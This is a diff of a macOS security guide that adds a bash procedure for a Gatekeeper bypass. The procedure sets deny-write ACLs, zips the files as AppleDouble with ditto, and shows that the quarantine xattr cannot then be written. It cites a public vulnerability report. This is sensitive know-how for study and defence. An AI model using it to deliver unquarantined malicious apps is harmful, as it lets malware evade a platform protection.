@@ -29,6 +29,9 @@ echo asd > /tmp/asd
 chflags uchg /tmp/asd
 xattr -w com.apple.quarantine "" /tmp/asd
 xattr: [Errno 1] Operation not permitted: '/tmp/asd'
+
+ls -lO /tmp/asd
+# check the "uchg" in the output
 ```
 
 ### defvfs mount
@@ -69,13 +72,41 @@ sleep 1
 ls -le /tmp/test
 ```
 
-### **com.apple.acl.text entitlement**
+### **com.apple.acl.text xattr + AppleDouble**
 
 **AppleDouble** file format copies a file including its ACEs.
 
 In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`**  is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
 
 Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.
+
+To replicate this we first need to get the correct acl string:
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+(Note that even if this works the sandbox write the quarantine xattr before)
+
+Not really needed but I leave it there just in case:
+
+{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
+[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
+{% endcontent-ref %}
 
 <details>
 
